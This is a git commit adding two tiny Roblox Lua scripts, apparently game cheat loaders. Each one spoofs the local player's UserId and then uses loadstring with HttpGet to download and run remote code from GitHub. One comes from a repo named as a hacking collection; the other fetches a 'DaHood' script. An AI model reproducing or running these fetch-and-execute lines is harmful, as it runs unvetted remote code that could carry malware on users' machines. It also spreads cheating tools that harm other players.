5bbb8eaacc7f552667d14f8b7a0ae07fef85c189
koolkids213 <162370785+koolkids213@users.noreply.github.com>
2024-03-05 15:03:42 -0500

    Add files via upload

---
+++ facechanger.lua
@@ -0,0 +1,2 @@
+game.Players.LocalPlayer.UserId = "3003513187"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RobloxHackerProLuaStuff/avatar-editor-thing/main/headless.lua"))()
---
+++ rayx.lua
@@ -0,0 +1,2 @@
+game.Players.LocalPlayer.UserId = "953043143"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/SpaceYes/Lua/Main/DaHood.Lua'))()
